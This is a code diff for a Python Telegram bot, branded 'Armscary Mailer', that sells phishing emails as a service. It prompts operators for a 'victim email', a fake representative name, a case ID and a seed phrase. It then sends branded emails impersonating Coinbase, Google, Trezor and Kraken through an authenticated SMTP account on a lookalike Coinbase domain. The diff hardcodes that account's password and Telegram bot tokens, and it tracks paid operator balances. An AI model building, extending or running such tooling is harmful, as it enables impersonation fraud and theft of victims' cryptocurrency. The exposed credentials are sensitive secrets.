@@ -35,24 +35,25 @@ file_handler.setFormatter(formatter)
 
 file_logger.addHandler(file_handler)
 
-email_count_file = "email_count.json"
-whitelist_file = "whitelist.json"
-log_file_path = "bot_logs.log"
+email_count_file = "stored/email_count.json"
+whitelist_file = "stored/whitelist.json"
+log_file_path = "stored/bot_logs.log"
 file_handler = logging.FileHandler(log_file_path, mode="a", encoding="utf-8")
 
-# Local Postfix configuration
-postfix_config = {
-    'server': 'localhost',
-    'port': 25,
-    'domain': 'usp5-sec.me'  # Your configured domain with DKIM/SPF
+# SMTP server details
+
+smtp_details = {
+
+            "server": "smtppro.zoho.eu",
+            "port": 465,
+            "username": "coinbase@mailserver15-coinbase.com",
+            "password": "ScatteredSpider1"
+
 }
 
-# Legacy compatibility (will be replaced with postfix_config)
-smtp_details = postfix_config
 
 
-# Admin ID
-ADMIN_ID = 7991166259
+ADMIN_ID = 7056970772
 
 AMOUNT_TOKEN = 9 
 CUSTOM_VICTIM_EMAIL, CUSTOM_SUBJECT, CUSTOM_SENDER_NAME, CUSTOM_DISPLAY_EMAIL, CUSTOM_HTML = range(5)
@@ -64,13 +65,13 @@ global_email_count = 0
 user_email_counts = {}
 whitelisted_users = []
 
-HTML_TEMPLATE_PATH = "coinbase_template.html"
-HTML_WALLET_TEMPLATE_PATH = "coinbase_wallet_template.html"
-HTML_SECURE_TEMPLATE_PATH = "coinbase_secure_template.html"
-HTML_GOOGLE_TEMPLATE_PATH = "google_template.html"
-HTML_TREZOR_TEMPLATE_PATH = "trezor.html"
-HTML_DELAY_TEMPLATE_PATH = "coinbase_transaction.html"
-balance_file = "balance.json"
+HTML_TEMPLATE_PATH = "templates/coinbase/cb2.html"
+HTML_WALLET_TEMPLATE_PATH = "templates/coinbase/seed.html"
+HTML_SECURE_TEMPLATE_PATH = "templates/coinbase/panel.html"
+HTML_DELAY_TEMPLATE_PATH = "templates/coinbase/delay.html"
+HTML_GOOGLE_TEMPLATE_PATH = "templates/google/google.html"
+HTML_TREZOR_TEMPLATE_PATH = "templates/trezor/trezor.html"
+balance_file = "stored/balance.json"
 user_balances = {}
 
 def load_balances():
@@ -128,32 +129,23 @@ def save_whitelist():
 
 
 def log_email_details(update: Update, command_type: str, victim_email: str, extra_info: dict = None):
-    """Logs email details for each command in the required format with enhanced verbose logging."""
+    """Logs email details for each command in the required format."""
     user = update.effective_user
     username = user.username if user.username else "Unknown"
     user_id = user.id
     current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    
-    # Enhanced logging with user interaction details
-    file_logger.info(f"[USER INTERACTION] User: @{username} (ID: {user_id}) | Command: /{command_type} | Time: {current_time}")
-    file_logger.info(f"[TARGET] Destination: {victim_email} | Template: {command_type}")
 
-    # Log specific details based on command type
+
     if command_type == "wallet_coinbase":
         log_message = f"@{username} / {user_id} | {victim_email} | {command_type} | Seed phrase: {extra_info['seed_phrase']} | {current_time}"
-        file_logger.info(f"[TEMPLATE DATA] Seed phrase provided: {extra_info['seed_phrase']}")
-    elif command_type == "coinbase_delay":
+
+    elif command_type == "secure_coinbase":
         log_message = f"@{username} / {user_id} | {victim_email} | {command_type} | Link: {extra_info['link']} | {current_time}"
-        file_logger.info(f"[TEMPLATE DATA] Custom link: {extra_info['link']}")
-    elif extra_info:
-        # Log any additional template-specific data
-        for key, value in extra_info.items():
-            file_logger.info(f"[TEMPLATE DATA] {key}: {value}")
-        log_message = f"@{username} / {user_id} | {victim_email} | {command_type} | {current_time}"
+
     else:
         log_message = f"@{username} / {user_id} | {victim_email} | {command_type} | {current_time}"
 
-    # Keep original format for compatibility
+
     file_logger.info(log_message)
 
 async def add_balance(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -175,14 +167,118 @@ async def add_balance(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
     await update.message.reply_text(
         f"Added ${amount} to user {target_user_id}'s balance."
     )
+    button1 = InlineKeyboardButton("💬 Start", callback_data='button1')
+    button2 = InlineKeyboardButton("📊 Info", callback_data='button2')
+    button3 = InlineKeyboardButton("⚙️ Admin", callback_data='button3')
+    button4 = InlineKeyboardButton("❌ Close", callback_data='button4')
+    
+async def startt(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Send a message when the command /start is issued."""
+    button1 = InlineKeyboardButton("💬 Start", callback_data='button1')
+    button2 = InlineKeyboardButton("📊 Info", callback_data='button2')
+    button3 = InlineKeyboardButton("⚙️ Admin", callback_data='button3')
+    button4 = InlineKeyboardButton("❌ Close", callback_data='button4')
+    keyboard = [
+    [button1, button2],  # First row: Button 1 and Button 2 side by side
+    [button3],           # Second row: Button 3
+    [button4]            # Third row: Button 4
+]
+
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    message = await update.message.reply_text( '📧 __*Welcome to Armscary Mailer*__\n\nPress `Start` to begin sending mails\nUse `Info` to view your information', parse_mode='MarkdownV2', reply_markup=reply_markup)
+    context.user_data['start_message_id'] = message.message_id
+async def start2(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None: 
+    """Send a message when the command /start is issued."""
+    button1 = InlineKeyboardButton("💬 Start", callback_data='button1')
+    button2 = InlineKeyboardButton("📊 Info", callback_data='button2')
+    button3 = InlineKeyboardButton("⚙️ Admin", callback_data='button3')
+    button4 = InlineKeyboardButton("❌ Close", callback_data='button4')
+    keyboard = [
+    [button1, button2],  # First row: Button 1 and Button 2 side by side
+    [button3],           # Second row: Button 3
+    [button4]            # Third row: Button 4
+]
+
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.edit_text( '📧 __*Welcome to Armscary Mailer*__\n\nPress `Start` to begin sending mails\nUse `Info` to view your information', parse_mode='MarkdownV2', reply_markup=reply_markup)
+
+async def buttonst(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Edit the start message based on the button pressed."""
+    query = update.callback_query
+    await query.answer()
+    
+    # Define the back button
+    button10 = InlineKeyboardButton("⏪ Back", callback_data='back2')
+    back_keyboard = [[button10]]
+    reply_markup_back = InlineKeyboardMarkup(back_keyboard)
+
+    # Change the message based on the callback data
+    if query.data == 'back2':
+        button1 = InlineKeyboardButton("💬 Start", callback_data='button1')
+        button2 = InlineKeyboardButton("📊 Info", callback_data='button2')
+        button3 = InlineKeyboardButton("⚙️ Admin", callback_data='button3')
+        button4 = InlineKeyboardButton("❌ Close", callback_data='button4')
+        keyboard = [
+            [button1, button2],
+            [button3],
+            [button4]
+        ]
+
+        start_message_id = context.user_data.get('start_message_id')
+        await context.bot.edit_message_text(
+            chat_id=query.message.chat.id,
+            message_id=start_message_id,
+            text='📧 __*Welcome to Armscary Mailer*__\n\nPress `Start` to begin sending mails\nUse `Info` to view your information',
+            parse_mode='MarkdownV2',
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+    elif query.data == 'button1':
+        await query.edit_message_text(
+            text="📧 __*Armscary Mailer*__ \n\n \[Coinbase\]\n• /employee \- Sends Coinbase Employee Verification Email\n• /panel \- Sends Coinbase Panel Link Email\n• /wallet \- Sends Wallet Email\n• /delay\- Sends Delay Email\n\n[Google]\n• /google \- Sends Employee Verification Email\n\n[Trezor]\n• /trezor \- Sends Employee Verification Email\n\n[Kraken]\n• /kraken \- Sends Kraken Employee Verification Email",
+            reply_markup=reply_markup_back,
+            parse_mode="MarkdownV2"
+        )
+    elif query.data == 'button2':
+        await query.edit_message_text(
+            text="📧 __*Armscary Mailer*__ \n\n For support please message t\.me/armscary",
+            parse_mode="MarkdownV2",
+            reply_markup=reply_markup_back
+        )
+    elif query.data == 'button3':
+        user_id = update.effective_user.id
+        if user_id != ADMIN_ID:
+            await query.edit_message_text("You are not authorized to use this command.")
+            return
+        await query.edit_message_text(
+            text="📧 __*Armscary Mailer Admin*__ \n\n /whitelist\n/add\_balance",
+            reply_markup=reply_markup_back,
+            parse_mode="MarkdownV2"
+        )
+    elif query.data == 'button4':
+        await query.edit_message_text(text="reuse /start")
+
+
+async def buttont(update: Update, context: ContextTypes.DEFAULT_TYPE, buttonst) -> None:
+    """Edit the start message based on the button pressed."""
+    query = update.callback_query
+    await query.answer()
+    
+    if query.data == 'coinbaseb':
+       await query.edit_message_text(text="📧 __*Armscary Mailer Coinbase*_\n\n /employee_coinbase\n/secure_coinbase\n/wallet_coinbase\n\coinbase_delay", parse_mode="MarkdownV2")
+    elif query.data == 'googleb':
+        await query.edit_message_text(text="📧 __*Armscary Mailer Google*_\n\n /employee_google", parse_mode="MarkdownV2")
+    elif query.data == 'trezorb':
+        await query.edit_message_text(text="📧 __*Armscary Mailer Trezor*_\n\n /employee_trezor", parse_mode="MarkdownV2")
+    elif query.data == 'krakenb':
+        await query.edit_message_text(text="📧 __*Armscary Mailer Kraken*_\n\n /employee_kraken", parse_mode="MarkdownV2")
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = update.effective_user.id
     user_count = user_email_counts.get(str(user_id), 0)
     balance = user_balances.get(str(user_id), 0)
     start_message = (
-        "Welcome to @starmailer\n"
-        "Support: @lovecoinbase\n\n"
+        "Welcome to @Mailer\n"
+        "Support: @armscary\n\n"
         "[Info]\n\n"
         f"• Mails sent: {global_email_count}\n"
         f"• Your mails sent: {user_count}\n"
@@ -208,7 +304,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     help_text = (
-        "Welcome to star mailer, i have no clue what to put here so just enjoy it."
+        "hi /start"
     )
     await update.message.reply_text(help_text)
 
@@ -291,7 +387,11 @@ async def get_recipients(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         ]
 
     reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text("Spoof as:", reply_markup=reply_markup)
+    await update.message.reply_text(
+            text="📧 __*Armscary Mailer*__ \n\n❓ Sender Email:" ,
+            parse_mode="MarkdownV2",
+            reply_markup=reply_markup
+            )
     return SPOOF_EMAIL
 
 async def custom_mail(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -358,7 +458,7 @@ async def get_custom_html(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         try:
             send_email_through_smtp(
                 sender_name,
-                f"noreply@{postfix_config['domain']}",
+                smtp_details["username"],
                 subject,
                 msg,
                 victim_email
@@ -389,7 +489,10 @@ async def wallet_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 
     context.user_data.clear()
     context.user_data["conversation"] = "wallet_coinbase"
-    await update.message.reply_text("Enter the victim email address:")
+    await update.message.reply_text(
+            text="📧 __*Armscary Mailer*__ \n\n❓ Enter Recipent Email:" ,
+            parse_mode="MarkdownV2"
+            )
     return RECIPIENTS
 
 async def employee_google(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -407,7 +510,10 @@ async def employee_google(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 
     context.user_data.clear()
     context.user_data["conversation"] = "employee_google"
-    await update.message.reply_text("Enter the victim email address:")
+    await update.message.reply_text(
+            text="📧 __*Armscary Mailer*__ \n\n❓ Enter Recipent Email:" ,
+            parse_mode="MarkdownV2"
+            )
     return RECIPIENTS
 
 async def secure_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -425,7 +531,10 @@ async def secure_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 
     context.user_data.clear()
     context.user_data["conversation"] = "secure_coinbase"
-    await update.message.reply_text("Enter the victim email address:")
+    await update.message.reply_text(
+            text="📧 __*Armscary Mailer*__ \n\n❓ Enter Recipent Email:" ,
+            parse_mode="MarkdownV2"
+            )
     return RECIPIENTS
 
 async def employee_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -443,7 +552,10 @@ async def employee_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 
     context.user_data.clear()
     context.user_data["conversation"] = "employee_coinbase"
-    await update.message.reply_text("Enter the victim email address:")
+    await update.message.reply_text(
+            text="📧 __*Armscary Mailer*__ \n\n❓ Enter Recipent Email:" ,
+            parse_mode="MarkdownV2"
+            )
     return RECIPIENTS
 
 async def spoof_email_choice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -459,7 +571,10 @@ async def spoof_email_choice(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await query.message.reply_text("Enter the seed phrase:")
         return SEED_PHRASE
     else:
-        await query.message.reply_text("Enter the representative name:")
+        await query.message.reply_text(
+            text="📧 __*Armscary Mailer*__ \n\n❓ Enter Representative Name:" ,
+            parse_mode="MarkdownV2"
+            )
         return REPRESENTATIVE
 
     
@@ -493,8 +608,11 @@ async def get_representative(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await update.message.reply_text("Enter the case ID:")
         return CASE_ID
     else:
-        await update.message.reply_text("Enter the case ID:")
-        return CASE_ID
+         await update.message.reply_text(
+            text="📧 __*Armscary Mailer*__ \n\n ❓Enter Case ID:" ,
+            parse_mode="MarkdownV2"
+            )
+    return CASE_ID
 
 async def get_case_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     context.user_data["case_id"] = update.message.text
@@ -536,7 +654,10 @@ async def get_case_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int
         message = await send_employee_coinbase_email(
             update, recipients, representative, case_id, display_email
         )
-        await update.message.reply_text(message)
+        await update.message.reply_text(
+            text="📧 __*Armscary Mailer*__ \n\n ✅ Coinbase Employee Verification Sent\." ,
+            parse_mode="MarkdownV2"
+            )
         return ConversationHandler.END
     else:
 
@@ -579,6 +700,7 @@ async def get_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         )
         await update.message.reply_text(message)
         return ConversationHandler.END
+    
     else:
        
         representative = context.user_data["representative"]
@@ -610,9 +732,9 @@ async def send_employee_coinbase_email(
 
    
     html_body = html_body.replace(
-        "Daniel Greene", representative
+        "mark", representative
     ) 
-    html_body = html_body.replace("1835246", case_id)
+    html_body = html_body.replace("897281", case_id)
 
     msg = MIMEMultipart("related")
     msg["Subject"] = "Case Review" 
@@ -623,15 +745,16 @@ async def send_employee_coinbase_email(
     msg.attach(html_part)
 
     try:
-  
-        with open("coinbase.png", "rb") as img_file:
-            img = MIMEImage(img_file.read(), name="coinbase.png")
+
+        with open("images/wallet.png", "rb") as img_file:
+            img = MIMEImage(img_file.read(), name="wallet_coinbase.png")
             img.add_header("Content-ID", "<logo>")
             msg.attach(img)
 
+
         send_email_through_smtp(
             "Coinbase",
-            f"noreply@{postfix_config['domain']}",
+            smtp_details["username"],
             "Coinbase Case Review",
             msg,
             recipients,
@@ -667,14 +790,14 @@ async def send_wallet_coinbase_email(context, recipients, seed_phrase, display_e
     msg.attach(html_part)
 
     try:
-        with open("wallet.png", "rb") as img_file:
+        with open("images/wallet.png", "rb") as img_file:
             img = MIMEImage(img_file.read(), name="wallet_coinbase.png")
             img.add_header("Content-ID", "<logo>")
             msg.attach(img)
 
         send_email_through_smtp(
             "Coinbase",
-            f"noreply@{postfix_config['domain']}",
+            smtp_details["username"],
             "Secure your assets to self-custody",
             msg,
             recipients,
@@ -710,14 +833,11 @@ async def send_secure_coinbase_email(
 
 
     try:
-        with open("coinbase.png", "rb") as img_file:
-            img = MIMEImage(img_file.read(), name="coinbase.png")
-            img.add_header("Content-ID", "<logo>")
-            msg.attach(img)
+
 
         send_email_through_smtp(
             "Coinbase",
-            f"noreply@{postfix_config['domain']}",
+            smtp_details["username"],
             "Secure Coinbase Token",
             msg,
             recipients,
@@ -748,8 +868,8 @@ async def send_employee_google_email(
         html_body = file.read()
 
 
-    html_body = html_body.replace("Daniel Greene", representative)
-    html_body = html_body.replace("1835246", case_id)
+    html_body = html_body.replace("Mark", representative)
+    html_body = html_body.replace("897281", case_id)
 
     msg = MIMEMultipart("related")
     msg["Subject"] = "Case Review"
@@ -761,13 +881,10 @@ async def send_employee_google_email(
 
 
     try:
-        with open("google_logo.png", "rb") as img_file:
-            img = MIMEImage(img_file.read(), name="google_logo.png")
-            img.add_header("Content-ID", "<logo>")
-            msg.attach(img)
+
 
         send_email_through_smtp(
-            "Google", f"noreply@{postfix_config['domain']}", "Google Case Review", msg, recipients
+            "Google", smtp_details["username"], "Google Case Review", msg, recipients
         )
         return "Google Employee Mail sent successfully!"
     except Exception as e:
@@ -836,7 +953,7 @@ async def send_employee_trezor_email(
 
     try:
      
-        with open("trezor.png", "rb") as img_file:
+        with open("images/trezor.png", "rb") as img_file:
            
             img = MIMEImage(img_file.read(), name="trezor.png")
             img.add_header("Content-ID", "<logo>")
@@ -844,7 +961,7 @@ async def send_employee_trezor_email(
 
         send_email_through_smtp(
             "Trezor",
-            f"noreply@{postfix_config['domain']}",
+            smtp_details["username"],
             "Your case is under review",
             msg,
             recipients,
@@ -881,7 +998,7 @@ async def send_employee_kraken_email(
         {"representative": representative, "case_id": case_id},
     )
 
-    template_path = "kraken.html"
+    template_path = "templates/kraken/kraken.html"
 
     if not os.path.exists(template_path):
         return "Failed to send email. Template file not found."
@@ -903,7 +1020,7 @@ async def send_employee_kraken_email(
     msg.attach(html_part)
 
 
-    for image in ["kraken.png", "kraken1.png", "kraken2.png"]:
+    for image in ["images/kraken.png", "images/kraken1.png", "images/kraken2.png"]:
         try:
             with open(image, "rb") as img_file:
                 img = MIMEImage(img_file.read(), name=image)
@@ -915,7 +1032,7 @@ async def send_employee_kraken_email(
     try:
         send_email_through_smtp(
             "Kraken",
-            f"noreply@{postfix_config['domain']}",
+            smtp_details["username"],
             "Your case is under review",
             msg,
             recipients,
@@ -972,14 +1089,14 @@ async def send_coinbase_delay_email(update: Update, context: ContextTypes.DEFAUL
     msg.attach(html_part)
 
     try:
-        with open("coinbase.png", "rb") as img_file:
+        with open("images/coinbase.png", "rb") as img_file:
             img = MIMEImage(img_file.read(), name="coinbase.png")
             img.add_header("Content-ID", "<logo>")
             msg.attach(img)
 
         send_email_through_smtp(
             "Coinbase",
-            f"noreply@{postfix_config['domain']}",
+            smtp_details["username"],
             "A manual review is pending",
             msg,
             recipients,
@@ -996,73 +1113,40 @@ async def send_coinbase_delay_email(update: Update, context: ContextTypes.DEFAUL
 
 
 
-def send_email_through_postfix(display_name, from_address, subject, msg, recipients):
-    """
-    Send email through local Postfix server without authentication.
-    Supports flexible sender spoofing via header manipulation.
-    Includes comprehensive verbose logging for email delivery.
-    """
+def send_email_through_smtp(display_name, smtp_username, subject, msg, recipients):
     try:
         recipient_list = (
             recipients.split(",") if isinstance(recipients, str) else recipients
         )
 
-        # Extract email details for logging
-        from_header = msg.get('From', 'Unknown')
-        reply_to_header = msg.get('Reply-To', 'None')
-        template_info = "Custom" if "custom" in display_name.lower() else display_name
-        
-        # Log email delivery details
-        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        file_logger.info(f"[EMAIL DELIVERY] Template: {template_info} | From: {from_header} | Reply-To: {reply_to_header} | To: {recipients} | Subject: {subject} | Time: {current_time}")
-        
-        # Connect to local Postfix (no authentication needed)
-        with smtplib.SMTP(postfix_config["server"], postfix_config["port"]) as server:
-            # No STARTTLS or login needed for localhost Postfix
-            
-            # Use the configured domain as envelope sender for DKIM signing
-            envelope_sender = f"noreply@{postfix_config['domain']}"
-            
-            # Log SMTP connection details
-            file_logger.info(f"[SMTP] Connecting to {postfix_config['server']}:{postfix_config['port']} | Envelope sender: {envelope_sender}")
-            
-            # Send the email with custom envelope sender
-            server.sendmail(envelope_sender, recipient_list, msg.as_string())
+        with smtplib.SMTP(smtp_details["server"], smtp_details["port"]) as server:
+            server.starttls()
+            server.login(smtp_username, smtp_details["password"])
 
-        # Log successful delivery
-        file_logger.info(f"[SUCCESS] {display_name} email delivered successfully to {recipients} via Postfix")
-        logging.info(f"{display_name} email sent successfully to {recipients} via Postfix")
-        return True
+            server.sendmail(smtp_username, recipient_list, msg.as_string())
+
+        logging.info(f"{display_name} email sent successfully to {recipients}")
 
     except Exception as e:
-        # Log delivery failure
-        file_logger.error(f"[FAILURE] Failed to send {display_name} email to {recipients}: {str(e)}")
-        logging.error(f"Failed to send email via Postfix: {str(e)}")
+        logging.error(f"Failed to send email: {str(e)}")
         raise e
-
-# Legacy compatibility function
-def send_email_through_smtp(display_name, smtp_username, subject, msg, recipients):
-    """
-    Legacy compatibility wrapper - redirects to Postfix implementation.
-    The smtp_username parameter is used as the from_address for the new function.
-    """
-    return send_email_through_postfix(display_name, smtp_username, subject, msg, recipients)
 
 def main():
     load_email_counts()
     load_whitelist()
 
-    TOKEN = "8186178497:AAEdDMEOIRtVYkdJJYoYB2riTvIcG-x3iZk"
+    TOKEN = "8111308700:AAH_6AjN90Im0Na3AsiEWRaAIjpMtn1cpeI"
     application = ApplicationBuilder().token(TOKEN).build()
 
     application.add_handler(CommandHandler("whitelist", whitelist))
-    application.add_handler(CommandHandler("add_balance", add_balance))
-    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("addbal", add_balance))
+    application.add_handler(CommandHandler("start", startt))
+    application.add_handler(CommandHandler("startt", startt))
     application.add_handler(CommandHandler("help", help_command))
     application.add_handler(CommandHandler("id", get_user_id))
 
     wallet_coinbase_handler = ConversationHandler(
-        entry_points=[CommandHandler("wallet_coinbase", wallet_coinbase)],
+        entry_points=[CommandHandler("wallet", wallet_coinbase)],
         states={
             RECIPIENTS: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
@@ -1073,11 +1157,10 @@ def main():
             ],
         },
         fallbacks=[CommandHandler("cancel", cancel)],
-        per_message=False,
     )
 
     employee_coinbase_handler = ConversationHandler(
-        entry_points=[CommandHandler("employee_coinbase", employee_coinbase)],
+        entry_points=[CommandHandler("employee", employee_coinbase)],
         states={
             RECIPIENTS: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
@@ -1091,11 +1174,10 @@ def main():
             ], 
         },
         fallbacks=[CommandHandler("cancel", cancel)],
-        per_message=False,
     )
 
     secure_coinbase_handler = ConversationHandler(
-        entry_points=[CommandHandler("secure_coinbase", secure_coinbase)],
+        entry_points=[CommandHandler("panel", secure_coinbase)],
         states={
             RECIPIENTS: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
@@ -1110,11 +1192,10 @@ def main():
             ], 
         },
         fallbacks=[CommandHandler("cancel", cancel)],
-        per_message=False,
     )
 
     employee_google_handler = ConversationHandler(
-        entry_points=[CommandHandler("employee_google", employee_google)],
+        entry_points=[CommandHandler("google", employee_google)],
         states={
             RECIPIENTS: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
@@ -1126,11 +1207,10 @@ def main():
             CASE_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_case_id)],
         },
         fallbacks=[CommandHandler("cancel", cancel)],
-        per_message=False,
     )
 
     employee_kraken_handler = ConversationHandler(
-        entry_points=[CommandHandler("employee_kraken", employee_kraken)],
+        entry_points=[CommandHandler("kraken", employee_kraken)],
         states={
             RECIPIENTS: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
@@ -1146,12 +1226,11 @@ def main():
             CASE_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_case_id)],
         },
         fallbacks=[CommandHandler("cancel", cancel)],
-        per_message=False,
     )
 
 
     employee_trezor_handler = ConversationHandler(
-        entry_points=[CommandHandler("employee_trezor", employee_trezor)],
+        entry_points=[CommandHandler("trezor", employee_trezor)],
         states={
             RECIPIENTS: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
@@ -1165,12 +1244,11 @@ def main():
             ],
         },
         fallbacks=[CommandHandler("cancel", cancel)],
-        per_message=False,
     )
 
 
     coinbase_delay_handler = ConversationHandler(
-    entry_points=[CommandHandler("coinbase_delay", coinbase_delay)],
+    entry_points=[CommandHandler("delay", coinbase_delay)],
     states={
         RECIPIENTS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)],
         SPOOF_EMAIL: [CallbackQueryHandler(spoof_email_choice)],
@@ -1178,10 +1256,9 @@ def main():
         LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_link)],  
     },
     fallbacks=[CommandHandler("cancel", cancel)],
-    per_message=False,
 )
     custom_mail_handler = ConversationHandler(
-    entry_points=[CommandHandler("custom_mail", custom_mail)],
+    entry_points=[CommandHandler("custom", custom_mail)],
     states={
         CUSTOM_VICTIM_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_victim_email)],
         CUSTOM_SUBJECT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_subject)],
@@ -1190,11 +1267,11 @@ def main():
         CUSTOM_HTML: [MessageHandler(filters.Document.ALL & ~filters.COMMAND, get_custom_html)],
     },
     fallbacks=[CommandHandler("cancel", cancel)],
-    per_message=False,
 )
 
 
     application.add_handler(custom_mail_handler)
+
     application.add_handler(coinbase_delay_handler)
     application.add_handler(employee_trezor_handler)
     application.add_handler(employee_kraken_handler)
@@ -1202,10 +1279,10 @@ def main():
     application.add_handler(employee_coinbase_handler)
     application.add_handler(secure_coinbase_handler)
     application.add_handler(employee_google_handler)
+    application.add_handler(CallbackQueryHandler(buttonst))
+    
 
     application.run_polling()
 
 if __name__ == "__main__":
     main()
-
-
